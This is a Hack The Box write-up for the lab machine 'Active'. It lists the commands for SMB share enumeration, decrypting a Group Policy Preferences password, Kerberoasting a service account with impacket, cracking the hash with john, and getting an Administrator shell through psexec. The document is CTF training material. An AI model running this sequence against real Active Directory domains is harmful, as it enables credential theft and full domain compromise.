# Active Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA active -Pn 10.10.10.100``
### or
``nmap -p- -sV -oA fullactive 10.10.10.100``
### and 
``nmap --script safe -445 10.10.10.100``

### DNS recon
``gobuster dns -d active.htb -t 25 -w /opt/seclists/Discovery/DNS/subdomains-top1million-20000.txt``

``dnsrecon -d 10.10.10.100 -r 10.0.0.0/8``

``nslookup ``

``server 10.10.10.100``

``127.0.0.1``

### SMB recon
``smbmap -H 10.10.10.100``

``enum4linux -a -u "" -p "" 10.10.10.100 ``

``enum4linux -a -u "guest" -p "" 10.10.10.100``

``smbclient -U '%' -L //10.10.10.100``

``smbclient -U 'guest%' -L //10.10.10.100``

### SMB to not miss anything in the share
``smbmap -R Replication -H 10.10.10.100``
``smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q``
### or 
``smbclient //10.10.10.100/Replication``
``RECURSE ON``
``PROMPT OFF``
``mget *``

# ${{\color{purple}Initial Foothold}}\ $

### I found a password in the Groups.xml file but what to do afterwards on a box where the port 3389 is not open ?

Decode password :

`python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

![image](https://user-images.githubusercontent.com/123066149/217777696-9092c454-7c24-4105-b10a-2a65fc5e4ef1.png)


# ${{\color{purple}Exploitation}}\ $

 ### 1) Find the users of the box 
``/usr/bin/impacket-GetADUsers -all -dc-ip 10.10.10.100 active.htb/svc_tgs``


![image](https://user-images.githubusercontent.com/123066149/217771016-d0786329-3bb6-4532-bb18-921fc95d9590.png)

### 2) List the user's rights on the shares  
Before 
![image](https://user-images.githubusercontent.com/123066149/217771660-8735c7cd-af60-48b9-982c-64d1fcedb241.png)
After
![image](https://user-images.githubusercontent.com/123066149/217771490-866b2fb7-5e4f-41b8-874a-e279cf7386ab.png)

### 3) Try a connection ( need Windows )

`runas /netonly /user:active.htb\svc_tgs cmd`

and list the shares :

`dir \\10.10.10.100\Users`

### 4) Try to get UserSPNs :

`/usr/bin/impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS` 

# ${{\color{purple}Privilege Escalation}}\ $

`/usr/bin/impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS` 

![image](https://user-images.githubusercontent.com/123066149/217774864-66183e11-96a7-4a42-819e-62e3e25316d9.png)

`john --wordlist=/usr/share/wordlists/rockyou.txt -format=krb5tgs ./krb5tgs.txt`

![image](https://user-images.githubusercontent.com/123066149/217775198-6f5eb564-77e6-4d6f-b49b-d23072f98973.png)

`/usr/bin/impacket-psexec active.htb/Administrator@10.10.10.100`

![image](https://user-images.githubusercontent.com/123066149/217775392-8a49d703-f564-4ac3-a139-34f4fccc0c69.png)

# ${{\color{purple}Points of Improvement}}\ $

* Add the domain ``active.htb`` directly from the ``host`` file.
* Before doing a ``locate`` command, use the ``updatedb`` command to update the database.
* Make an nmap script to know the version of smb ``nmap --script safe -445 10.10.10.100``
* Remember to change the ``/``in the command : ``/usr/bin/impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS``
Otherwise the command does not work     
